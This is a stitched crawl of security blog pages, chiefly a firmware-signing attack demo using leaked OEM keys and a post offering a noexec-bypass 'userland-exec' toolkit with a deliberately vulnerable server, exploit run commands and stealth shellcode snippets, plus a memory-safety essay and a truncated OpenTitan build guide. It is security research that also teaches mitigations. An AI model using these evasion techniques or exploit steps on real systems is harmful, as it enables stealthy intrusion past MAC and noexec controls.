## Demonstration of Supply Chain Threats


Following extensive research, the HardcoreMatrix team reconstructed internal tools that were missing from the manufacturer’s arsenal and successfully executed a comprehensive attack chain targeting the [MSI Modern-15-B12M](https://www.techradar.com/reviews/msi-modern-15-b12m) laptop (equipped with an Intel 12th Gen CPU: i5-1235U). The demonstration encompassed activities such as BootGuard private key re-signing, capsule update re-signing, and SMM Rootkit deployment. This compelling demonstration video underscores the severity of supply chain threats, showcasing their real-world impact. The demo does not cover OS kernel attack techniques or SMM bootkit since these techniques has been documented well with multiple open source implementation.


The hardware specification of MSI Modern-15-B12M system is as follows: ![bootjail1](https://hardenedlinux.org/images/bootjail/bootjail1.png)


First, we checked the UEFI BIOS hardware write protection status: ![bootjail1](https://hardenedlinux.org/images/bootjail/bootjail2.png)


And we extracted the UEFI image: ![bootjail1](https://hardenedlinux.org/images/bootjail/bootjail3.png)


Before the experiment, we developed a custom DXE module to display a logo. We injected the custom module into the UEFI image. ![bootjail1](https://hardenedlinux.org/images/bootjail/bootjail4.png)


We attempted to perform a write operation on the unsigned BIOS image: ![bootjail1](https://hardenedlinux.org/images/bootjail/bootjail5.png)


As expected, the write operation failed. After analyzing the leaked data, we managed to locate the BootGuard private key for the corresponding model and signed the BIOS image. ![bootjail1](https://hardenedlinux.org/images/bootjail/bootjail6.png)


Since the BIOS write protection SMM_BWP=1 under AMI’s framework, we need to use AFU to flash the BIOS image. In this particular scenario, both the Capsule verification process and the verification carried out during AFU image writing employ the same public key. Therefore, we also need to sign the BIOS image using the Capsule private key.


![bootjail1](https://hardenedlinux.org/images/bootjail/bootjail7.png)


Finally, we successfully flashed the signed image using AFU. ![bootjail1](https://hardenedlinux.org/images/bootjail/bootjail8.png)


After reboot, the custom module works as expected! ![bootjail1](https://hardenedlinux.org/images/bootjail/bootjail9.png)


Full demo:


## Mitigation


OEM vendors usually would only suggesting you upgrade to the latest firmware. The latest firmware replaces the leaked capsule key, making it more difficult for attackers to target UEFI. But there are some effective defense mechanisms to mitigate the risks while facing such risks. Three aspects are inevitable. Firstly, it is crucial to strengthen protection at the OS level. This can be achieved through the implementation of runtime protection such as [PaX/GRsecurity](https://grsecurity.net/) and [VED](https://hardenedvault.net/blog/2023-07-09-protecting-linux-kernel-why-how/), as well as adopting MAC (Mandatory Access Control) and sandboxing techniques. These measures fortify the system against various exploit vectors. At the firmware level, a recommended approach is to consider transitioning from UEFI to [coreboot](https://www.coreboot.org/). Coreboot represents the next-generation firmware and empowers users to become OEM manufacturers themselves. This paradigm shift gives users the right to perform hardware security provisioning, effectively granting them control over the entire supply chain. By embracing coreboot, users align with the principles of self-sovereignty, reducing the inherent security risks associated with the supply chain and vulnerabilities.


The second aspect involves leveraging trusted computing in a comprehensive manner. Trusted computing is a powerful concept, but it presents a delicate balance. If users have the right and capability for secure provisioning, trusted computing becomes an ally, enhancing security and trust. However, if users lack control and transparency as UEFI, they may fall into the trap of [treacherous computing](https://www.gnu.org/philosophy/can-you-trust.en.html), as discussed by Richard Stallman. MSI’s leaked materials put all x86 users to a risky position as the OEM signing has been compromised. However, if a user possesses their own key, the situation becomes entirely different.


The third aspect pertains to continuous security monitoring and auditing of both the OS and firmware. Regular assessments and audits help identifying vulnerabilities, detect potential threats, and implement timely mitigations. Several specialized companies, such as [HardenedVault](https://hardenedvault.net/), [Immune](https://immune.gmbh/) and [Binarly](https://binarly.io/), have made significant contributions to the development and dissemination of robust below-OS security practices in their respective technical domains.


## Epilogue


The world is currently facing a severe situation, as the [use of bootkits in malware/ransomware](https://github.com/hardenedvault/bootkit-samples) attacks is on the rise. The leaked OEM signing keys by MSI has further worsened the already vulnerable state of x86 firmware security. Despite this, many people (including security professionals) still struggle to understand the significance of threats originating from below-OS. Consider the potential consequences if a bootkit were to be implanted in the firmware of a crypto custody key management service node. Such an exploit could easily facilitate a [weak entropy-as-a-service](https://blog.ledger.com/Funds-of-every-wallet-created-with-the-Trust-Wallet-browser-extension-could-have-been-stolen/) by leveraging memory scanning and hooks. In this scenario, attackers could [steal private keys](https://twitter.com/klever_io/status/1679267565434986501) from the public chain through little push of brute-force attacks, all without even touching the custody infrastructure physically.


Nevertheless, there is no need to scare out of death and it’s also unwise to put false hope on “future technologies” like RISC-V or Rust. Instead, try to take control of the secure provisioning process for each device is a feasible plan. Sound like a plan! Stick with the fuc* plan! It’s a good starting point, isn’t it?

---

# UEFI

`https://hardenedlinux.org/tags/uefi`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2023


# [Boot Unguarded: x86 Trust Anchor Downfalls to The Leaked OEM Internal Tools and Signing Keys](https://hardenedlinux.org/blog/2023-09-07-boot-unguarded-x86-trust-anchor-downfalls-to-the-leaked-oem-internal-tools-and-signing-keys/)


              Sep
              7

---

# BootGuard

`https://hardenedlinux.org/tags/bootguard`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2023


# [Boot Unguarded: x86 Trust Anchor Downfalls to The Leaked OEM Internal Tools and Signing Keys](https://hardenedlinux.org/blog/2023-09-07-boot-unguarded-x86-trust-anchor-downfalls-to-the-leaked-oem-internal-tools-and-signing-keys/)


              Sep
              7

---

# Stealthy RCE on Hardened Linux: noexec + Userland Execution PoC

`https://hardenedlinux.org/blog/2026-04-13-stealthy-rce-on-hardened-linux-noexec--userland-execution-poc`

# HardenedLinux

Running arbitrary ELFs on noexec,nosuid,nodev mounts – without ever whispering execve(2) to the kernel.

*Running arbitrary ELFs on `noexec,nosuid,nodev` mounts – without ever whispering `execve(2)` to the kernel.*


A straight-from-the-underground deep dive into the [**userland-exec** toolkit](https://github.com/hardenedlinux/userland-exec). We built it. We drop it. We own the box.


## The Radical Threat Model (because “defense in depth” is just marketing until you test it)


Sysadmins think they’ve won when they slap this on:


```bash
mount -t tmpfs -o noexec,nosuid,nodev tmpfs /tmp/noexec_demo
```


Add SELinux enforcing or a tight AppArmor profile and they call it a day. But the real threat model – the one the underground has respected since the grugq days – is brutally simple:


```
                  Attacker launches exploit
                           |
                           v
               +-------------------------+
               |   Remote code execution |
               |   (stack smash, fmtstr, |
               |    use-after-free...)   |
               +-------------------------+
                           |
                           v
                Target: Hardened Linux Box
          ┌─────────────────────────────────────┐
          │  • SELinux (enforcing) or AppArmor  │
          │  • /tmp mounted noexec,nosuid,nodev │
          │  • Full modern mitigations          │
          └─────────────────────────────────────┘
                           |
                           v
               Process pwned -- arbitrary code exec
                           |
                           v
                   USERLAND-EXEC TAKES OVER
          ┌─────────────────────────────────────┐
          │  • Parse ELF in userspace           │
          │  • mmap / memfd_create segments     │
          │  • W^X signal handler dance         │
          │  • Direct jmp to e_entry            │
          └─────────────────────────────────────┘
                           |
                           v
               Stealthy RCE achieved.
       Original process name & context intact.
       No execve(2) ever called. No MAC hooks.
       noexec? What noexec.
```


**May your userland-exec payload not nuke your own cyber bunker.**


This is exactly the scenario laid out in the [grsecurity-101 threat model documentation](https://github.com/hardenedlinux/grsecurity-101-tutorials/blob/master/threat_model/userland_exec_noexec_bypass.md): once arbitrary code execution is achieved inside a process, filesystem-based and execve-centric controls become largely theater. The kernel never gets a chance to enforce `noexec` because the binary never travels through the kernel’s execution path.


We took that reality, turned it into a clean, reusable library, and wrapped it in a realistic RCE demo so you can watch the bypass happen live.


## How Userland Exec Actually Works (high-level, no handwaving)


Forget handing the kernel the crown via `execve`. Our `userland_execv()` does it the cypherpunk way – entirely in userspace:


- Parses the target ELF header and program segments (`PT_LOAD`)
- `mmap()`s (or `memfd_create` + `mmap`) every segment straight into the current address space
- Handles relocations and dynamic linking when the payload needs it
- Transfers control with a direct jump to the new ELF’s entry point


Result? The process image is replaced *in place*. `ps`, `top`, `/proc/<pid>/comm` still show the original binary name. No new process, no audit trail that screams “new exec”.


## Userland-Exec Internals (the gory bits)


Everything lives in `src/`. It’s a full in-process ELF loader built for hostile environments. Highlights:


- **ELF parsing & loading**: Manual walk through program headers, no libc hand-holding.
- **Memory mapping**: `mmap()` or `memfd_create` + `mmap` chains – zero reliance on the kernel’s exec path.
- **W^X bypass** (`bypass_wx.c`): Map pages `PROT_EXEC`, catch `SIGSEGV` on write attempts, flip to `PROT_WRITE` temporarily, restore `PROT_EXEC` after init. Beautiful signal-handler kung-fu that laughs at `execmem` denials.
- **SELinux / AppArmor dodging**: Skip `mprotect()` entirely when possible. `memfd_create` + `munmap` + `mmap` flows keep the policy engine in the dark.
- **Control transfer**: Straight `jmp` to `e_entry`. Process context (UID, open fds, etc.) preserved.


This is why the technique eats hardened boxes for breakfast.


## The rce_demo: Real-World Attack Chain


We shipped a deliberately vulnerable TCP server (`victim_server.c`) with:


- Format-string leak in the banner (bye-bye ASLR)
- Classic stack buffer overflow (`recv()` into 64-byte buffer, RIP smash at offset 72)


Linked against `libuserland-exec.a`, compiled with mitigations turned *off* for clarity (you’ll re-enable them in real ops).


### Exploit flow (exploit.py does it all)


1. Offline recon (`nm`, `objdump`) for gadgets and offsets.
2. Format-string infoleak → full ASLR defeat.
3. ROP chain (ret + `jmp rsp` from libc) to pivot to stack shellcode.
4. Ship the ELF payload over the wire.


**Shellcode modes:**


**Disk mode (for when you don’t care about traces):**


```c
fd = open("/tmp/noexec_rce_demo/payload", O_WRONLY|O_CREAT, 0755);
write(fd, payload, size);
userland_execv(fd);   // noexec? what noexec?
```


**Memfd mode (the *real* stealth play):**


```c
memfd = memfd_create("stealth_payload", 0);
write(memfd, payload, size);
lseek(memfd, 0, SEEK_SET);
userland_execv(memfd);   // zero on-disk footprint
```


The demo payload just phones home:


```c
printf("[+] Userland RCE successful!\n");
printf(" PID : %d\n UID : %d\n Kernel : %s\n Hostname: %s\n",
       getpid(), getuid(), read_file("/proc/version"), read_file("/proc/sys/kernel/hostname"));
```


*We shipped a deliberately vulnerable TCP server (victim_server.c) with:*

## Setup Instructions (VM only, kids)


```bash
git clone https://github.com/hardenedlinux/userland-exec.git
cd userland-exec
mkdir build && cd build
cmake ..
make -j$(nproc)
```


Victim side:


```bash
sudo ./rce_demo/setup.sh          # drops the noexec tmpfs
./build/rce_demo/victim_server    # listens on 4444
```


Pwn it:


```bash
python3 rce_demo/exploit.py                     # local test
python3 rce_demo/exploit.py --target <ip>       # remote
python3 rce_demo/exploit.py --target <ip> --mode memfd   # ghost mode
```


![boom!!](https://hardenedlinux.org/images/uexec-rce-demo.png)


Cleanup:


```bash
sudo ./rce_demo/setup.sh cleanup
```


Requirements: x86_64 Linux, CMake, GCC, binutils, Python 3.10+, root on victim for the tmpfs.


## Stealth & Bypass Scorecard


- **noexec**: 100% evaded. Never hits the kernel check.
- **SELinux / AppArmor**: Most execve-tied hooks skipped. `memfd` + signal W^X laughs at `execmem`.
- **Stealth**: Original comm name intact. Memfd mode = zero filesystem artifacts. `ps` and `top` lie for you.


## Limitations (we keep it real)


Demo disables ASLR/PIE/stack canaries/etc. so you can see the technique clearly. Real engagements need a proper initial vector + extra bypasses for modern mitigations. But the core primitive remains lethal once you’ve got code exec.


## [Mitigations?](https://github.com/hardenedlinux/grsecurity-101-tutorials/blob/master/threat_model/userland_exec_noexec_bypass.md)


- PaX/GRsecurity **TPE + RBAC** – the only thing that actually stops this class of attack.
- Strict seccomp filters that clamp `memfd_create`, suspicious `mmap` patterns, and signal abuse.
- Run services in the tightest possible DAC/MAC sandbox with minimal caps.
- Layered defense > single silver bullets like `noexec`.
- [FFI is the beast forever](https://github.com/hardenedlinux/grsecurity-101-tutorials/blob/master/threat_model/userland_exec_noexec_bypass.md#extra-bonus-from-the-legacy-of-0ldsk00l-hackers), the old legacy from GRHack


## Conclusion


The userland-exec project (and its rce_demo) is proof that once arbitrary code execution lands inside a process, most of the “hardened Linux” playbook turns into expensive theater. Noexec, MAC policies, filesystem controls – all bypassed in userspace with zero kernel involvement.


Clone it. Build it. Run the demo on your “secure” box. Then ask yourself how many of your production systems would survive the same treatment.


[https://github.com/hardenedlinux/userland-exec](https://github.com/hardenedlinux/userland-exec)


**May your userland-exec payload never nuke your own cyber bunker.**


Stay dangerous. – the crew


---


**Tags:** linux pwnage, noexec bypass, userland exec, stealthy RCE, SELinux, AppArmor, red team, grsecurity, oldskool hacking, W^X dance

---

# hardware

`https://hardenedlinux.org/tags/hardware`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2021


# [Cheap PCB story](https://hardenedlinux.org/blog/2021-02-10-cheap-pcb-story/)


              Feb
              10

---

# PCB design

`https://hardenedlinux.org/tags/pcb-design`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2021


# [Cheap PCB story](https://hardenedlinux.org/blog/2021-02-10-cheap-pcb-story/)


              Feb
              10

---

# The Path to Memory Safety is Inevitable

`https://hardenedlinux.org/blog/2025-05-07-the-path-to-memory-safety-is-inevitable`

by Shawn Chang


## Background


In recent years, memory safety has become a hot topic. However, when discussing “memory safety,” it is important to first clarify what exactly is being addressed and what the goals are. Are you focusing on using compiler-based static analysis (such as [Clang Static Analyzer](https://clang-analyzer.llvm.org/), rustc, etc.) to catch potential issues at compile time, or do you trust the compiler to successfully compile the code and then rely on runtime mechanisms (like garbage collection in Go or Java) to resolve all problems? Or are you solely concerned with the ultimate goal of security hardening, that is, saving the system from the attackers? The complexity of memory safety issues reflects the very nature of security: it is an interdisciplinary field that combines computer science with complexity theory, making it extraordinarily difficult to fully master. Therefore, the idea of completely eliminating all security vulnerabilities by rewriting existing software with one or several “memory-safe languages” is not a realistic solution.


A programming language might be designed with memory safety mechanisms in mind, such as garbage collection and array bounds checking, which depict an ideal state at the specification level. In reality, however, different implementers may adopt various strategies based on requirements and performance metrics. For example, although Lisp typically comes with a garbage collector, supports flexible data manipulation, and features a dynamic type system, this does not guarantee that all Lisp interpreters can completely eliminate memory safety issues. If, in pursuit of certain requirements or performance, some security checks are compromised, then vulnerabilities such as buffer overflows or illegal pointer accesses may still occur.


Similarly, C/C++ have long been regarded as “unsafe” languages because they allow programmers to directly manipulate memory and perform pointer arithmetic. However, with rigorous engineering methods, such as static analysis tools, strict code reviews, and runtime detection mechanisms. It is possible for C/C++ code in specific environments to reach an almost bug-free state. This article will explore some of the approaches employed by HardenedLinux over the past few decades in mitigating system complexity and enhancing memory safety. Overall, memory safety is not solely the responsibility of either the compiler or the runtime, with success requiring coordinated efforts across language design, tool support, and engineering practices to ultimately achieve a system that resists compromise. This article will not address topics such as mandatory access control, sandboxing, Linux kernel hardening or anything related to how to compromise a Lisp machine via DMA attack.


## Choosing a GNU/Linux Distribution for Production Systems


The early members of HardenedLinux came from a few commercial Linux distribution background, so we know that building a GNU/Linux distribution isn’t difficult. However, creating a distribution that is maintained long-term and remains stable requires much higher standards. First and foremost, vital software and libraries must be managed by professional maintainers. When it comes to handling bug fixes and security vulnerabilities, maintainers do not simply hand off the problems to upstream sources, instead, they carefully weigh the options and, in most cases, choose a backports approach to preserve the original features and stability.


Based on these considerations, HardenedLinux’s best practices are primarily based on the Debian distribution, which, at the time, was the only community-driven with highly skills maintainers. Once the base distribution is selected, the primary challenge becomes addressing the quality and security risks inherent in applications and dependent libraries developed in “memory-unsafe” languages (such as C/C++). Before sanitizers and fuzzers were widely adopted, large-scale bug hunting usually required enormous manual effort. Nowadays, however, simply enabling sanitizers and running regular regression tests can effectively catch most issues during the QA process; furthermore, extensive fuzz testing can be introduced to more comprehensively capture potential vulnerabilities. Even at the GNU/Linux distribution level, QA can adopt this approach, with only a few components, such as compilers and the C runtime (glibc/musl/etc) can’t be sanitized.


In addition, we spent years developing a state-based Linux kernel fuzzer and, in 2020, contributed a coverage filter feature to the upstream Google Syzkaller. This might be one of the few significantly influential features emerging from the Asian open-source community. The technical approach that combines fuzz testing with sanitizers is a classic enhanced memory safety solution. Taking the Linux kernel as an example, different user scenarios rely on different kernel subsystems: storage servers depend more on the file system, while network servers focus more on the network protocol stack. Later, a state-model-based fuzz testing tool known as [VaultFuzzer](https://hardenedvault.net/blog/2022-08-07-state-based-fuzzer-update/) was developed—supporting stress testing of specific target systems. For instance, on a system equipped with a 32-core CPU and 64GB of RAM, it takes only about 20 hours to achieve approximately 72% code coverage for the main parts of the network protocol implementation. Of course, some might argue that the remaining 28% of the code still poses memory safety risks. In response, our approach is to adopt an overall security architecture design, such as implementing runtime mitigation measures at the kernel level, to further bridge this gap. We will discuss this issue shortly.


## From Exploitability to Memory Safety Solutions


The full lifecycle of a vulnerability typically includes the following stages:


- Identifying the bug and assessing whether it can be exploited
- If deemed exploitable, confirming it as a vulnerability and writing a PoC (Proof of Concept)
- Adapting the PoC into a stable exploit
- Digital arms dealers integrating it into a weaponized framework


During the QA engineer’s bug hunting process, the tools and workflows used (such as fuzzers + sanitizers) are quite similar to those employed by security researchers. From the perspective of a security researcher, the process of exploiting a vulnerability can generally be divided into three stages:


![](https://hardenedvault.net/images/blog/exp-stage_hu03e1646bf366ee782e12122446a74d25_64219_1749x256_fit_q100_h2_box_3.webp)


- Pre-exploitation phase (bug triggering)
- Exploitation phase
- Post-exploitation phase (e.g., implanting a rootkit)


The bug triggering phase is viewed as the pre-exploitation stage. For free and open-source software projects, issues in this phase should ideally be handled by the QA process. So, aside from the commonly used sanitizers and fuzzers, what other methods can be employed during this phase to detect vulnerabilities? This is where the value of our exciting open-source project Fil-C comes into play.


[Fil-C is a memory safety solution for C/C++](https://github.com/pizlonator/llvm-project-deluge) developed by Epic Games, employing a rather radical approach. Fil-C customizes the Clang/LLVM compiler and makes improvements to related compiler libraries to better support various transformation passes and the C runtime (such as musl); at the same time, some libraries and applications require minimal code adaptations. The following is a series of [test cases](https://github.com/hardenedlinux/memory-safety-coverage-test):


| Bug type | Sanitizers | Fil-C | Clang bounds-safety |
| --- | --- | --- | --- |
| 0-out-of-bounds-access.c | YES (ASAN) | NO | NO |
| 2-out-of-bounds-access.c | YES (ASAN) | YES | NO |
| 3-out-of-bounds-in-bounds.c | YES (ASAN) | YES | NO |
| 1-overflowing-out-of-bounds.c | NO (ASAN) | YES | N/A |
| 4-bad-syscall.c | NO (ASAN) | YES | N/A |
| 5-type-confusion.c | NO (ASAN) | YES | N/A |
| 6-use-after-free.c | YES (ASAN) | YES | N/A |
| 7-pointer-races.c | YES (ASAN/TSAN) | Partially | N/A |
| 8-data-races.c | YES (TSAN) | NO | N/A |


By comparing the detection capabilities of Fil-C with those of traditional sanitizers, we can see that although Fil-C cannot resolve all issues, it has successfully achieved memory-safe C/C++ from an exploitability standpoint, rendering common vulnerabilities harmless. Interestingly, Fil-C not only helps you identify problems, but you can even compile some critical components with it to serve as an independent runtime (perhaps we’ll see this reflected in the next generation of Epic Games’ titles?). Of course, Fil-C’s performance and engineering maturity are not yet at the point of general adoption, but it represents a very promising direction.


## Exploit vs. Mitigation


Since we have discussed the bug hunting process, it is equally important to delve into mitigation. If relying on a sanitizer+fuzzer model cannot uncover all bugs, and the target program cannot adopt a memory-safe C/C++ solution like Fil-C due to performance considerations, then one can consider supplementing the system with a series of mitigation techniques provided by the compiler and the C runtime library.


These mitigation techniques include implementations at the hardware level (such as NX, CET, BTI, etc.), as well as a large number of software implementations. Do not underestimate these software-level protection measures: at critical moments, they can play a vital role. Although Attacking the CORE in 2007 shifted its focus to the kernel, countless cases demonstrate that even user-space programs require them. A recent [write-up by ret2](https://blog.ret2.io/2025/04/23/pwn2own-soho-2024-diskstation/) described how, in the Pwn2Own Ireland 2024 competition, the exploitation construction for an RCE remote exploit against the Synology DiskStation DS1823xs+ was carried out. Had Synology’s security team simply enabled FULL RELRO and CFI, the defense would have been significantly improved, greatly increasing the difficulty of exploitation, and the outcome of the story might have been entirely different. Here is our commonly referenced list of mitigations:


| Bug type | Sanitizers |
| --- | --- |
| Stack canary | -fstack-protector-* |
| Shadow stack | -mshstk (GCC), -fsanitize=safe-stack (CLANG) |
| Fortified source | -D_FORTIFY_SOURCE=3 |
| Full ASLR with PIE | -pie |
| Control flow integrity | x86: -fcf-protection=, arm64: -mbranch-protection=, SW |
| Relocation only | -Wl,-z,now |
| Bounds check | -XClang -fexperimental-bounds-safety (CLANG) |


## Call for Action


In recent years, during discussions with open source developers and even security researchers, I have repeatedly heard the objection that although Google attempts to preemptively find vulnerabilities through bug hunting, many issues still slip through. Given this, shouldn’t we simply rewrite our software and libraries using memory-safe languages? At first glance, this notion seems to have some merit, but in reality, it contradicts other facts. A few months ago, while talking with a security engineer from Southern Europe, he complained that an open source cryptography component related to hardware security modules (HSM) still had a “segmentation fault”. Puzzled, I asked whether the debug/test builds hadn’t enabled sanitizers. Unfortunately, we confirmed that this library indeed did not integrate a sanitizer. Please do not jump to conclusions: this library is not OpenSSL. OpenSSL has long integrated sanitizers and has ensured that all regression tests pass.


Returning to the argument, “if even Google cannot resolve these issues, then we must rewrite everything,” it becomes problematic. From the perspective of 0ldsk00l hackers and cypherpunks, individuals should have self-sovereignty. Should we simply ignore these issues just because Google hasn’t fixed every problem? Hell no. You need to fix the shits for yourself and that may the benefit of the entire community as well.


Therefore, I call on all free and open source software developers: please at least enable sanitizers in your debug and test builds. If everyone does so, this will be the lowest cost approach to making the world a safer place.


## Rewriting Software


Rewriting software and libraries using memory-safe languages is an expensive endeavor. If you have thoroughly considered this approach and decide to proceed, please consider rewriting them in Lisp/Scheme.


## Reference


CC Bounds Checking Example [https://williambader.com/bounds/example.html](https://williambader.com/bounds/example.html)


The Fil-C Manifesto: Garbage In, Memory Safety Out! [https://github.com/pizlonator/llvm-project-deluge/blob/deluge/Manifesto.md](https://github.com/pizlonator/llvm-project-deluge/blob/deluge/Manifesto.md)


[https://github.com/pizlonator/llvm-project-deluge/blob/deluge/invisicaps_by_example.md](https://github.com/pizlonator/llvm-project-deluge/blob/deluge/invisicaps_by_example.md)


Exploiting the Synology DiskStation with Null-byte Writes: Achieving remote code execution as root on the Synology DS1823xs+ NAS [https://blog.ret2.io/2025/04/23/pwn2own-soho-2024-diskstation/](https://blog.ret2.io/2025/04/23/pwn2own-soho-2024-diskstation/)


memory-safety-coverage-test [https://github.com/hardenedlinux/memory-safety-coverage-test](https://github.com/hardenedlinux/memory-safety-coverage-test)


Technical analysis of syzkaller based fuzzers: It’s not about VaultFuzzer! [https://hardenedvault.net/blog/2022-08-07-state-based-fuzzer-update/](https://hardenedvault.net/blog/2022-08-07-state-based-fuzzer-update/)

---

# OpenTitan

`https://hardenedlinux.org/tags/opentitan`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2020


# [OpenTitan RTL synthesis with Yosys using sv2v and RTL-to-GDS generated by OpenROAD](https://hardenedlinux.org/blog/2020-05-14-opentitan-rtl-synthesis-with-yosys-using-sv2v-and-rtl-to-gds-generated-by-openroad/)


              May
              14

---

# OpenROAD

`https://hardenedlinux.org/tags/openroad`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2020


# [OpenTitan RTL synthesis with Yosys using sv2v and RTL-to-GDS generated by OpenROAD](https://hardenedlinux.org/blog/2020-05-14-opentitan-rtl-synthesis-with-yosys-using-sv2v-and-rtl-to-gds-generated-by-openroad/)


              May
              14

---

# Kernel exploitation

`https://hardenedlinux.org/tags/kernel-exploitation`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2019


# [Demo for exploiting use-after-free in dedicated cache](https://hardenedlinux.org/blog/2019-02-20-demo-for-exploiting-use-after-free-in-dedicated-cache/)


              Feb
              20


## 2017


# [Exploiting on CVE-2016-6787](https://hardenedlinux.org/blog/2017-10-16-exploiting-on-cve-2016-6787/)


              Oct
              16


## 2016


# [An Introduction to Linux Kernel Exploitation](https://hardenedlinux.org/blog/2016-01-19-an-introduction-to-linux-kernel-exploitation/)


              Jan
              19

---

# Firmware

`https://hardenedlinux.org/tags/firmware`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2023


# [Boot Unguarded: x86 Trust Anchor Downfalls to The Leaked OEM Internal Tools and Signing Keys](https://hardenedlinux.org/blog/2023-09-07-boot-unguarded-x86-trust-anchor-downfalls-to-the-leaked-oem-internal-tools-and-signing-keys/)


              Sep
              7


## 2018


# [Hunting Shadows in the Era of Covert Warfare: The Counterstrike Against Demons from the "Ring -3" World for Firmware Freedom](https://hardenedlinux.org/blog/2018-07-04-hunting-shadows-in-the-era-of-covert-warfare-the-counterstrike-against-demons-from-the-ring-3-world-for-firmware-freedom/)


              Jul
              4


## 2017


# [Firmware auditing with CHIPSEC](https://hardenedlinux.org/blog/2017-07-31-firmware-auditing-with-chipsec/)


              Jul
              31


## 2017


# [Mission impossible: Hardening the x86 based core infrastructures](https://hardenedlinux.org/blog/2017-03-17-mission-impossible-hardening-the-x86-based-core-infrastructures/)


              Mar
              17


## 2016


# [Neutralize ME firmware on SandyBridge and IvyBridge platforms](https://hardenedlinux.org/blog/2016-11-17-neutralize-me-firmware-on-sandybridge-and-ivybridge-platforms/)


              Nov
              17

---

# Linux kernel

`https://hardenedlinux.org/tags/linux-kernel`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2019


# [Demo for exploiting use-after-free in dedicated cache](https://hardenedlinux.org/blog/2019-02-20-demo-for-exploiting-use-after-free-in-dedicated-cache/)


              Feb
              20


## 2017


# [Exploiting on CVE-2016-6787](https://hardenedlinux.org/blog/2017-10-16-exploiting-on-cve-2016-6787/)


              Oct
              16


## 2016


# [Linux kernel mitigation checklist](https://hardenedlinux.org/blog/2016-12-13-linux-kernel-mitigation-checklist/)


              Dec
              13

---

# Side channel

`https://hardenedlinux.org/tags/side-channel`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2018


# [Nightmares( Meltdown/Spectre/L1TF) never goes away](https://hardenedlinux.org/blog/2018-08-16-nightmares-meltdown/spectre/l1tf-never-goes-away/)


              Aug
              16

---

# meltdown

`https://hardenedlinux.org/tags/meltdown`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2018


# [Nightmares( Meltdown/Spectre/L1TF) never goes away](https://hardenedlinux.org/blog/2018-08-16-nightmares-meltdown/spectre/l1tf-never-goes-away/)


              Aug
              16

---

# OpenTitan RTL synthesis with Yosys using sv2v and RTL-to-GDS generated by OpenROAD

`https://hardenedlinux.org/blog/2020-05-14-opentitan-rtl-synthesis-with-yosys-using-sv2v-and-rtl-to-gds-generated-by-openroad`

# HardenedLinux

May 14, 2020 - 11 minute read - Research

[OpenTitan](https://opentitan.org) is the first open source project building a transparent, high-quality reference design and integration guidelines for silicon root of trust (RoT) chips. [Yosys](https://github.com/YosysHQ/yosys) is a free/libre and open source framework for RTL synthesis tools. It currently has extensive Verilog-2005 support and provides a basic set of synthesis algorithms for various application domains. OpenTitan is a systemverilog project, but currently yosys only supports a small subset of systemverilog. So we need [sv2v](https://github.com/zachjs/sv2v) to convert the source code to verilog.


Open source tools used:


1. Source code conversion tool [sv2v](https://github.com/zachjs/sv2v)
2. RTL synthesis tools [yosys](https://github.com/YosysHQ/yosys)


# Install toolchain


## Install sv2v


sv2v provides pre-built binaries, we can download from [release page] ( [https://github.com/zachjs/sv2v/releases](https://github.com/zachjs/sv2v/releases)) according to our own system, then unzip to executable path.


We can also build from source code. Since sv2v is a Haskell project, we need to install Haskell’s build system on our computer, please refer to [Stack](https://docs.haskellstack.org/en/stable/README/). Through the following command we can obtain the source code of sv2v and build an executable file.


```
git clone https://github.com/zachjs/sv2v.git
cd sv2v
make
```


When the command completes the executable file is located at `./bin/sv2v`. Copy the executable file to executable path, then the installation is complete.


## Install yosys


If the system you are using is debian, you can install directly via apt-get.


If your system does not provide yosys, you can install from source code. Some prerequisites are need to build yosys, you can install the using the following command:


```
sudo apt-get install build-essential clang bison flex \
	libreadline-dev gawk tcl-dev libffi-dev git \
	graphviz xdot pkg-config python3 libboost-system-dev \
	libboost-python-dev libboost-filesystem-dev zlib1g-dev
```


Then you need to get the source code of yosys, get it by the following command:


```
git clone https://github.com/YosysHQ/yosys.git
```


Then build by the following command:


```
make config-gcc
make
```


Then install by the following command:


```
make install DESTDIR=path_you_want_to_install_to
```


# Transcoding


OpenTitan is a complex project, it has some auxiliary programs to automatically generate some code. By reading the documentation, we can get the source code we need by the following command:


```
sudo apt-get install autoconf bison build-essential clang-format curl flake8 \
    flex g++ git libelf1 libelf-dev libftdi1-2 libftdi1-dev libssl-dev \
    libusb-1.0-0 make ninja-build pkgconf python3 python3-pip \
    python3-setuptools python3-wheel python3-yaml srecord tree zlib1g-dev

# install some python tools, execute in the path of opentitan
pip3 install --user --requirement python-requirements.txt

# Get gcc toolchain of riscv, execute in the path of opentitan
./util/get-toolchain.py

# install verilator
export VERILATOR_VERSION=4.028
git clone http://git.veripool.org/git/verilator
cd verilator
git checkout v$VERILATOR_VERSION
autoconf
./configure --prefix=/tools/verilator/$VERILATOR_VERSION
make
make install

export PATH=$PATH:/tools/riscv/bin:/tools/verilator/4.028/bin

git clone https://github.com/lowRISC/opentitan.git
cd opentitan
git checkout 75639fe11cd00896a57c34576b8574b6152168df
fusesoc --cores-root . run --target=sim --setup --build lowrisc:systems:top_earlgrey_verilator
```


Note: The execution of fusesoc above will cause an error, and the following corrections need to be made:


```diff
diff --git a/hw/ip/prim/util/primgen.py b/hw/ip/prim/util/primgen.py
index 49e73436..d22b3214 100755
